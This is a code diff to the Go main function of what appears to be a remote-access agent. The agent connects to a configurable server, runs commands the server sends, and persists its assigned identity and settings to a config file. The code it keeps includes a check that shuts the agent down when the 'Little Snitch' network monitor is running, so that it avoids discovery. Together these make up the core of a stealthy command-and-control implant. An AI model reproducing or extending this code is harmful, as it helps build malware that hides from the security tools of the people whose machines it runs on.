@@ -55,7 +55,9 @@ func main() {
 	server := flag.String("server", "localhost:8000", "Server hostname.")
 	verboseFlag := flag.Bool("verbose", false, "Additional debugging logs.")
 	unsafe := flag.Bool("unsafe", false, "Turn off all discovery safe guards.")
+	workDir := flag.String("workdir", "./", "Set the working directory")
 	retryDelay := flag.Int("delay", 300, "Delay, in seconds, before reconnection attempts.")
+	configReset := flag.Bool("reset", false, "If true, it will reset use the flags and reset the config file.")
 
 	flag.Parse()
 
@@ -63,13 +65,13 @@ func main() {
 	shared.MaxMessageSize = 1024 * 1024 * 1024
 	shared.Logger = Debug
 
+	system := InitSystem(*configReset, *server, *workDir, *unsafe, *retryDelay)
+
 	interrupt := make(chan os.Signal, 1)
 	signal.Notify(interrupt, os.Interrupt)
 
-	system := InitSystem()
-
 	// Is it OK to run on this machine?
-	if !*unsafe && processRunning("Little Snitch") {
+	if !system.unsafe && processRunning("Little Snitch") {
 		Debug("Monitoring program found. Shutting down.")
 		os.Exit(0)
 	}
@@ -88,6 +90,7 @@ func main() {
 		switch message.Action {
 		case "setName":
 			system.UUID = string(message.Body)
+			system.saveConfig()
 		case "runCommand":
 			output, err := system.RunCommand(message)
 			if err != nil {
@@ -119,7 +122,7 @@ func main() {
 	go func() {
 		for {
 			Debug("Checking connection...")
-			if connection.Establish(GetServer(*server)) {
+			if connection.Establish(GetServer(system.Server)) {
 				go connection.WritePump()
 				go connection.ReadPump()
 
